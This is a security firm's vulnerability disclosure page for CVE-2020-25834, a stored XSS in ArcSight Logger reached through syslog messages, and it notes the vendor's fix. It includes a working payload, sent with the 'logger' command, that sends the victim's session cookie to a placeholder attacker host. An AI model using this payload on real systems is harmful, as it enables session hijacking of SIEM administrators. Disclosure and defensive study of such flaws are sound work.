<!DOCTYPE html>
<html lang="en-us"><head>
  <!-- Basic Page Needs -->
  <meta charset="utf-8">
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  
  <meta name="description" content="CVE-2020-25834 discovered by Hidde Smit">
  <meta name="author" content="Cyber Eagle | Hidde Smit">
  <meta name="generator" content="Cyber Eagle | Hidde Smit">
  
  <!-- Mobile Specific Metas -->
  <meta name="format-detection" content="telephone=no">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>CVE-2020-25834 ArcSight Logger Stored XSS</title>
  <link rel="icon" href="https://www.cybereagle.io/images/favicon.ico">

  <!-- Twitter Bootstrs CSS -->
  <link rel="stylesheet" href="https://www.cybereagle.io/plugins/bootstrap/bootstrap.min.css">
  <!-- Ionicons Fonts Css -->
  <link rel="stylesheet" href="https://www.cybereagle.io/plugins/ionicons/ionicons.min.css">
  <!-- animate css -->
  <link rel="stylesheet" href="https://www.cybereagle.io/plugins/animate-css/animate.css">
  <!-- Hero area slider css-->
  <link rel="stylesheet" href="https://www.cybereagle.io/plugins/slider/slider.css">
  <!-- slick slider -->
  <link rel="stylesheet" href="https://www.cybereagle.io/plugins/slick/slick.css">
  <!-- Fancybox -->
  <link rel="stylesheet" href="https://www.cybereagle.io/plugins/facncybox/jquery.fancybox.css">
  <!-- hover -->
  <link rel="stylesheet" href="https://www.cybereagle.io/plugins/hover/hover-min.css">
  <!-- template main css file -->
  
  <link rel="stylesheet" href="https://www.cybereagle.io/css/style.min.css" integrity="" media="screen">
</head><body><section class="top-bar animated-header">
	<div class="container">
		<div class="row">
			<div class="col-lg-12">
				<nav class="navbar navbar-expand-lg navbar-light bg-light">
					<a class="navbar-brand" href="https://www.cybereagle.io/">
						<img src="https://www.cybereagle.io/images/logo.png" alt="Cyber Eagle | Professional penetration testing services">
					</a>
					<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navigation"
						aria-controls="navigation" aria-expanded="false" aria-label="Toggle navigation">
						<span class="navbar-toggler-icon"></span>
					</button>

					<div class="collapse navbar-collapse" id="navigation">
						<ul class="navbar-nav ml-auto">
							<li class="nav-item">
								<a class="nav-link" href="https://www.cybereagle.io/">Home</a>
							</li>
							
							<li class="nav-item">
								<a class="nav-link" href="https://www.cybereagle.io/blog">Blog</a>
							</li>
							
							<li class="nav-item">
								<a class="nav-link" href="https://www.cybereagle.io/contact">Contact</a>
							</li>
							
						</ul>
					</div>
				</nav>
			</div>
		</div>
	</div>
</section>

<section class="global-page-header">
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <div class="block">
                    <h2>CVE-2020-25834 ArcSight Logger Stored XSS</h2>
                    <div class="portfolio-meta">
                        <span>Thursday, Nov 26, 2020</span>
                    </div>
                </div>
            </div>
        </div>
    </div>
</section>

<section class="single-post">
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                
                <div class="post-content">
                    <h1 id="arcsight">ArcSight</h1>
<p>A recent pentest engagement was focused on the security of ArcSight SIEM solutions. The pentest scope was:</p>
<ul>
<li>ArcSight Management Center</li>
<li>ArcSight Logger</li>
<li>ArcSight Connector</li>
</ul>
<p>ArcSight Management Center is a centralized security management center that manages large deployments of ArcSight solutions. Newly discovered devices, connectors and loggers are listed in the Management Center web-interface.</p>
<p>ArcSight Logger is a comprehensive log management solution for easier compliance, efficient log search, and secure storage. In short, ArcSight Logger is a SIEM Log Management tool. Presenting users with a dashboard in which logs are presented, for easy analysis.</p>
<p>Logs are sent to an ArcSight Connector. A Connector automates the process of collecting and managing logs from any device and in any format through normalization and categorization of logs into a unified format known as Common Event Format (CEF). An ArcSight Connector parses and forwards the logs to the ArcSight Logger.</p>
<p>The vulnerability described below can be performed by a malicious actor who is on the same network as the ArcSight Logger.</p>
<h2 id="vulnerability-write-up">Vulnerability write-up</h2>
<p>In collaboration with <a href="https://www.wbsec.nl/">WBSec</a>, Cyber Eagle has discovered a stored XSS in ArcSight Logger. This vulnerability has been assigned to <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25834">CVE-2020-25834</a>.</p>
<p>The ArcSight Logger has a web-interface present on TCP port 9000. ArcSight Connector has an open Syslog port available on TCP/UDP 514.</p>
<p>The first step is to try and get Syslog events parsed by ArcSight Logger. This was quite simple and can be performed with any Linux system having Syslog packages installed.
The command below can be used to send Syslog events to the ArcSight Connector:</p>
<p><code>logger -n &lt;host&gt; -P 514 -T &quot;example message&quot;</code></p>
<p>When sending a Syslog event, the source host will be displayed in ArcSight Manager and the Syslog event will be parsed and displayed in ArcSight Logger.
First thing that comes to mind is to try and send a HTML injection payload. Command below results in HTML injection in ArcSight Logger:</p>
<p><code>logger -n &lt;host&gt; -P 514 -T &quot;&lt;h1&gt;test&lt;/h1&gt;&quot;</code></p>
<p>To retrieve the parsed Syslog event. You need to visit the Analyse page in ArcSight Logger and filter on:</p>
<p><code>dvchost=&lt;attacker_hostname&gt;</code></p>
<p>When successfully filtered you will notice that your Syslog event has been parsed and is displayed in &lsquo;heading 1&rsquo; style.</p>
<p>The Content-Security-Policy in ArcSight Logger uses the directives &lsquo;unsafe-inline&rsquo; and &lsquo;unsafe-eval&rsquo;. This means that JavaScript code can be executed inline, remote JavaScript sources can&rsquo;t be used because of &lsquo;script-src&rsquo; &lsquo;self&rsquo;.
The &lsquo;session_string&rsquo; cookie which is needed for authenticated sessions is not protected with the HttpOnly cookie flag.</p>
<p>Using this knowledge, the following command can be used to send a stored XSS payload which will successfully steal cookies:</p>
<p><code>logger -n &lt;host&gt; -P 514 -T &quot;&lt;img src=x onerror=this.src='http://&lt;attacker_host&gt;/?c='+document.cookie&gt;&quot;</code></p>
<p><img src="/images/blog/xss.png" alt="XSS example"></p>
<p>Attempts have been made to perform the same XSS attack in ArcSight Logger classic search and ArcSight Management Center. However, output was successfully filtered.</p>
<h2 id="remediation">Remediation</h2>
<p>Micro Focus has released update 7.1.1 for ArcSight Logger which succesfully mitigates this vulnerability and some other vulnerabilities. You can find the release notes <a href="https://community.microfocus.com/t5/Logger/Logger-Release-Notes-7-1-1/ta-p/2837600">here</a>.</p>

                </div>
            </div>
        </div>
    </div>
</section>


<!-- Call To Action Section Start -->
<section id="call-to-action">
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <div class="block">
                    <h2 class="title wow fadeInDown" data-wow-delay=".3s" data-wow-duration="500ms">LOOKING FOR A SECURITY ASSESSMENT ?</h2>
                    <p class="wow fadeInDown" data-wow-delay=".5s" data-wow-duration="500ms">Don't hesitate to contact me!</p>
                    <a href="/contact" class="btn btn-default btn-contact wow fadeInDown" data-wow-delay=".7s" data-wow-duration="500ms">Contact me</a>
                </div>
            </div>

        </div>
    </div>
</section>
<!-- Call To Action Section End -->


<!-- Footer Section Start -->
<footer id="footer">
    <div class="container">
        <div class="row content-justify-between">
            <div class="col-md-8 col-12 text-center text-lg-left text-md-left">
                <p class="copyright">Copyright Â© 
                    <span>
                        <script>document.write(new Date().getFullYear())</script>
                    </span> Cyber Eagle
                </p>
            </div>
            <div class="col-md-4 col-12">
                <!-- Social Media -->
                <ul class="social text-center text-md-right text-lg-right">
                    
                    <li><a href="https://www.linkedin.com/company/cybereagle"><i class="ion-logo-linkedin"></i></a></li>
                    
                </ul>
            </div>
        </div>
    </div>
</footer>
<!-- footer section end -->

<!-- jquery -->
<script src="https://www.cybereagle.io/plugins/jQurey/jquery.min.js"></script>
<!-- Form Validation -->
<script src="https://www.cybereagle.io/plugins/form-validation/jquery.form.js"></script>
<script src="https://www.cybereagle.io/plugins/form-validation/jquery.validate.min.js"></script>
<!-- slick slider -->
<script src="https://www.cybereagle.io/plugins/slick/slick.min.js"></script>
<!-- bootstrap js -->
<script src="https://www.cybereagle.io/plugins/bootstrap/bootstrap.min.js"></script>
<!-- wow js -->
<script src="https://www.cybereagle.io/plugins/wow-js/wow.min.js"></script>
<!-- slider js -->
<script src="https://www.cybereagle.io/plugins/slider/slider.js"></script>
<!-- Fancybox -->
<script src="https://www.cybereagle.io/plugins/facncybox/jquery.fancybox.js"></script>
<!-- template main js -->

<script src="https://www.cybereagle.io/js/script.min.js"></script>
<!-- google analitycs -->
</body>
</html>